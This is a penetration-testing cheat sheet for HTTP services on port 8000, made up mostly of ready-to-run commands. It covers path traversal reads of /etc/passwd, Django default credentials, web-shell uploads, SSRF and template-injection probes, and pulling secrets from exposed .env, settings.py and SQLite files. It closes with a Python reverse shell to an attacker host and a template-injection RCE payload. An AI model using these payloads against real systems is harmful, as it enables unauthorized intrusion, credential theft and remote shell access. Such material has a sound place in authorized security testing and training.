# HTTP ALTERNATIVE ENUMERATION (Port 8000)

## SERVICE OVERVIEW
```
Port 8000 is commonly used for:
- Development web servers (Python, Node.js, Ruby)
- Alternative HTTP services
- Django development server
- SimpleHTTPServer (Python)
- Testing/staging environments
- Docker containers
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p8000 <IP>                             # Service/Version detection
curl -I http://<IP>:8000                         # HTTP headers
wget --server-response --spider http://<IP>:8000 2>&1 | grep "Server:"
nc -nv <IP> 8000                                 # Manual banner grab
```

## WEB SERVER DETECTION
```bash
# Identify web server/framework
whatweb http://<IP>:8000 -a 3                    # Aggressive fingerprinting
curl -I http://<IP>:8000 | grep -i "server\|x-powered"

# Common applications on 8000:
# - Python SimpleHTTPServer
# - Django development server
# - Node.js/Express apps
# - Ruby on Rails development
# - Flask development server
# - Docker containers
```

## PYTHON SIMPLEHTTPSERVER DETECTION
```bash
# Detect Python SimpleHTTPServer
curl -I http://<IP>:8000 | grep -i "SimpleHTTP"

# SimpleHTTPServer characteristics:
# - Directory listing enabled by default
# - Server: SimpleHTTP/0.6 Python/2.7.x
# - Often serves current directory
# - No authentication

# Browse directories
curl http://<IP>:8000/
curl http://<IP>:8000/../
curl http://<IP>:8000/../../
```

## DIRECTORY ENUMERATION
```bash
# Directory brute forcing
gobuster dir -u http://<IP>:8000 -w /usr/share/wordlists/dirb/common.txt -t 50
dirbuster -u http://<IP>:8000 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
ffuf -u http://<IP>:8000/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Common paths to check
/admin
/api
/static
/media
/uploads
/files
/docs
/debug
/test
/.git
```

## DJANGO DEVELOPMENT SERVER
```bash
# Detect Django
curl http://<IP>:8000 | grep -i django
curl -I http://<IP>:8000 | grep -i django

# Django debug mode detection
curl http://<IP>:8000/nonexistent | grep -i "DEBUG"
curl http://<IP>:8000/admin                      # Django admin panel

# Common Django paths
/admin/                                          # Admin interface
/api/                                            # REST API
/static/                                         # Static files
/media/                                          # Media files
/__debug__/                                      # Debug toolbar (if enabled)

# Django admin default credentials
admin:admin
admin:password
django:django
```

## DIRECTORY LISTING EXPLOITATION
```bash
# If directory listing enabled (common on port 8000)
curl http://<IP>:8000/
wget -r http://<IP>:8000/                        # Recursive download
wget -m http://<IP>:8000/                        # Mirror entire site

# Look for sensitive files:
curl http://<IP>:8000/.git/config
curl http://<IP>:8000/.env
curl http://<IP>:8000/config.py
curl http://<IP>:8000/settings.py               # Django settings
curl http://<IP>:8000/database.db               # SQLite database
curl http://<IP>:8000/db.sqlite3                # Django SQLite DB
curl http://<IP>:8000/credentials.txt
curl http://<IP>:8000/passwords.txt
curl http://<IP>:8000/.ssh/id_rsa
```

## GIT REPOSITORY EXPLOITATION
```bash
# Check for exposed .git directory
curl http://<IP>:8000/.git/config
curl http://<IP>:8000/.git/HEAD

# Download entire .git repository
wget -r http://<IP>:8000/.git/
git-dumper http://<IP>:8000/.git/ output/

# Extract git repository
githack http://<IP>:8000/.git/ output/

# After downloading:
cd output
git log                                          # View commit history
git show                                         # View commits
git diff HEAD~1                                  # Check for secrets in diffs
git checkout .                                   # Restore files
grep -r "password\|secret\|api" .                # Search for secrets
```

## NODE.JS / EXPRESS DETECTION
```bash
# Detect Node.js
curl -I http://<IP>:8000 | grep -i "express\|node"

# Common Node.js vulnerabilities
# - Prototype pollution
# - Command injection
# - Path traversal
# - Insecure dependencies

# Test for common paths
curl http://<IP>:8000/package.json               # Package info
curl http://<IP>:8000/node_modules/              # Dependencies
```

## PATH TRAVERSAL TESTING
```bash
# Test path traversal
curl http://<IP>:8000/../../../etc/passwd
curl http://<IP>:8000/..%2f..%2f..%2fetc/passwd
curl http://<IP>:8000/....//....//....//etc/passwd
curl http://<IP>:8000/files?file=../../../../etc/passwd

# Windows
curl http://<IP>:8000/..\..\..\..\windows\system32\drivers\etc\hosts
curl http://<IP>:8000/files?file=..\..\..\..\windows\win.ini
```

## API ENDPOINT DISCOVERY
```bash
# Common API paths
curl http://<IP>:8000/api
curl http://<IP>:8000/api/v1
curl http://<IP>:8000/api/v2
curl http://<IP>:8000/rest
curl http://<IP>:8000/graphql
curl http://<IP>:8000/swagger.json
curl http://<IP>:8000/api-docs
curl http://<IP>:8000/openapi.json

# Test API endpoints
ffuf -u http://<IP>:8000/api/FUZZ -w /usr/share/wordlists/api-endpoints.txt
```

## FILE UPLOAD TESTING
```bash
# Look for upload functionality
curl http://<IP>:8000/upload
curl http://<IP>:8000/api/upload

# Test file upload
curl -X POST -F "file=@shell.php" http://<IP>:8000/upload
curl -X POST -F "file=@shell.py" http://<IP>:8000/upload
curl -X POST -F "file=@shell.jsp" http://<IP>:8000/upload
```

## VULNERABILITY SCANNING
```bash
# Nikto scan
nikto -h http://<IP>:8000

# Nmap scripts
nmap -p8000 --script http-enum <IP>
nmap -p8000 --script http-vuln-* <IP>
nmap -p8000 --script vuln <IP>

# Searchsploit
searchsploit django
searchsploit flask
searchsploit express
searchsploit node.js
```

## SENSITIVE FILE ENUMERATION
```bash
# Configuration files
curl http://<IP>:8000/config.py
curl http://<IP>:8000/settings.py
curl http://<IP>:8000/local_settings.py
curl http://<IP>:8000/.env
curl http://<IP>:8000/.env.local
curl http://<IP>:8000/.env.production

# Database files
curl http://<IP>:8000/db.sqlite3
curl http://<IP>:8000/database.db
curl http://<IP>:8000/app.db

# Backup files
curl http://<IP>:8000/backup.sql
curl http://<IP>:8000/backup.tar.gz
curl http://<IP>:8000/backup.zip

# Source code
curl http://<IP>:8000/app.py
curl http://<IP>:8000/main.py
curl http://<IP>:8000/server.js
curl http://<IP>:8000/index.js
```

## COMMON MISCONFIGURATIONS
```
☐ Directory listing enabled                      # Information disclosure
☐ Debug mode enabled                             # Stack traces, config info
☐ .git directory exposed                         # Source code disclosure
☐ Database files accessible                      # Data breach
☐ .env files exposed                             # Credentials leak
☐ No authentication                              # Open access
☐ Default credentials                            # Easy access
☐ Backup files accessible                        # Sensitive data
☐ Source code accessible                         # Logic disclosure
☐ Development server in production              # Insecure configuration
```

## QUICK WIN CHECKLIST
```
☐ Check for directory listing
☐ Look for .git directory
☐ Check for .env files
☐ Look for database files (db.sqlite3)
☐ Test for path traversal
☐ Check Django admin (/admin)
☐ Look for config files (settings.py, config.py)
☐ Test for default credentials
☐ Check for debug mode
☐ Look for backup files
☐ Enumerate API endpoints
☐ Test file upload functionality
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive scan
nmap -sV -p8000 --script "http-*" -oA http_8000_enum <IP>

# Quick directory listing check
curl http://<IP>:8000/ | grep -i "directory\|index of"

# Fast directory scan
gobuster dir -u http://<IP>:8000 -w /usr/share/wordlists/dirb/common.txt -t 50 -q
```

## POST-EXPLOITATION
```bash
# After finding exposed files
# Download .git repository
git-dumper http://<IP>:8000/.git/ gitdump/
cd gitdump && git log --all

# Download database
curl http://<IP>:8000/db.sqlite3 -o db.sqlite3
sqlite3 db.sqlite3 ".tables"
sqlite3 db.sqlite3 "SELECT * FROM users;"

# Extract credentials from .env
curl http://<IP>:8000/.env | grep -E "PASSWORD|SECRET|KEY|TOKEN"

# Read Django settings
curl http://<IP>:8000/settings.py | grep -E "SECRET_KEY|DATABASE|PASSWORD"

# If Python SimpleHTTPServer, current directory is served
# Download everything:
wget -r -np http://<IP>:8000/
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/http/dir_scanner           # Directory scanner
use auxiliary/scanner/http/http_header           # Header enumeration
use auxiliary/scanner/http/http_version          # Version detection
set RHOSTS <IP>
set RPORT 8000
run
```

## ADVANCED TECHNIQUES
```bash
# Django debug mode exploitation
# If DEBUG=True, detailed error pages reveal:
# - Full file paths
# - Environment variables
# - Database queries
# - Source code snippets

# Trigger error to get debug page:
curl http://<IP>:8000/nonexistent
curl http://<IP>:8000/' OR '1'='1

# Check for insecure deserialization (Python pickle)
# Django uses pickle for sessions - can lead to RCE

# SSRF testing
curl http://<IP>:8000/fetch?url=http://127.0.0.1:22
curl http://<IP>:8000/proxy?url=file:///etc/passwd

# Template injection (Django/Jinja2)
curl "http://<IP>:8000/?name={{7*7}}"            # Should return 49 if vulnerable
curl "http://<IP>:8000/?name={{config}}"         # Dump config
```

## DOCKER CONTAINER DETECTION
```bash
# Port 8000 often used in Docker containers
# Look for:
/.dockerenv                                      # Docker environment file
curl http://<IP>:8000/.dockerenv

# Container escape attempts (if RCE achieved)
cat /proc/1/cgroup | grep docker                 # Check if in container
mount | grep docker                              # Docker mounts
env | grep DOCKER                                # Docker env vars
```

## PYTHON RCE PAYLOADS (If vulnerable)
```python
# Python reverse shell (for vulnerable apps)
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])

# Django template injection RCE
{{ ''.__class__.__mro__[1].__subclasses__()[414]('whoami',shell=True,stdout=-1).communicate()[0].strip() }}
```
